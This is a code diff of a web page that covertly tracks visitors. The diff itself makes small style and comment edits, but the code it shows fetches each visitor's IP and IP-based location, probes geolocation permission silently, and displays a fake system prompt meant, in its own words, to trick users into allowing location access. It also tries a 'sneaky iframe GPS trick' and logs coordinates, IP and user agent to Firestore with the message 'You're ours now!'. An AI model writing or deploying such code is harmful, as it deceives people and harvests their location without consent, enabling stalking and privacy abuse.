@@ -9,6 +9,7 @@
       font-family: Arial, sans-serif;
       text-align: center;
       background: #f0f0f0;
+      padding: 20px;
     }
     #status {
       margin: 20px auto;
@@ -18,6 +19,7 @@
       max-width: 400px;
       border-radius: 6px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      min-height: 50px;
     }
     .fake-prompt {
       position: fixed;
@@ -67,26 +69,25 @@
   const db = firebase.firestore();
 
   const statusDiv = document.getElementById("status");
-
-  function logStatus(message) {
-    console.log(message);
-    statusDiv.textContent = message;
+  function logStatus(msg) {
+    console.log(msg);
+    statusDiv.textContent = msg;
   }
 
-  // Fetch visitor IP (via ipify)
+  // Get visitor public IP
   async function getVisitorIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
       logStatus(`Visitor IP fetched: ${data.ip || "unknown"}`);
       return data.ip || "unknown";
-    } catch (err) {
+    } catch(err) {
       logStatus(`Failed to fetch visitor IP: ${err}`);
       return "unknown";
     }
   }
 
-  // Save location + IP + source to Firestore
+  // Save data to Firestore
   function saveToFirestore(lat, lon, ip, source) {
     const ua = navigator.userAgent;
     const time = new Date().toISOString();
@@ -100,7 +101,7 @@
     }).then(() => {
       logStatus(`Location logged via ${source}. You're ours now!`);
     }).catch(err => {
-      logStatus(`Error logging your data: ${err}`);
+      logStatus(`Error logging data: ${err}`);
     });
   }
 
@@ -125,7 +126,7 @@
     return { lat: data.latitude || null, lon: data.longitude || null };
   }
 
-  // Fallback IP location: average results of multiple APIs
+  // Fallback IP location averaging multiple sources
   function fallbackToIPLocation(visitorIP) {
     logStatus("GPS failed or denied, scraping your IP location...");
     Promise.all([
@@ -154,7 +155,7 @@
     });
   }
 
-  // Fake system prompt UI to trick user into granting location access
+  // Fake prompt UI to trick user to allow location
   function showFakePrompt(visitorIP, callback) {
     const promptDiv = document.createElement("div");
     promptDiv.className = "fake-prompt";
@@ -187,7 +188,7 @@
     };
   }
 
-  // Probe if geolocation permission was already granted
+  // Probe for silent granted geolocation permission
   async function probeSilentGeolocation(visitorIP) {
     if ("geolocation" in navigator) {
       try {
@@ -212,7 +213,7 @@
             if (!success) tryIframeTrick(visitorIP);
           });
         }
-      } catch (err) {
+      } catch {
         logStatus("Permissions API error, showing fake prompt...");
         showFakePrompt(visitorIP, success => {
           if (!success) tryIframeTrick(visitorIP);
@@ -224,7 +225,7 @@
     }
   }
 
-  // Iframe geolocation trick fallback
+  // Sneaky iframe geolocation fallback
   async function tryIframeTrick(visitorIP) {
     return new Promise((resolve) => {
       logStatus("Trying sneaky iframe GPS trick...");
@@ -263,7 +264,7 @@
     });
   }
 
-  // Main entry point
+  // Main entry
   (async () => {
     if(location.protocol !== "https:") {
       logStatus("⚠️ Warning: Geolocation only works reliably on HTTPS.");
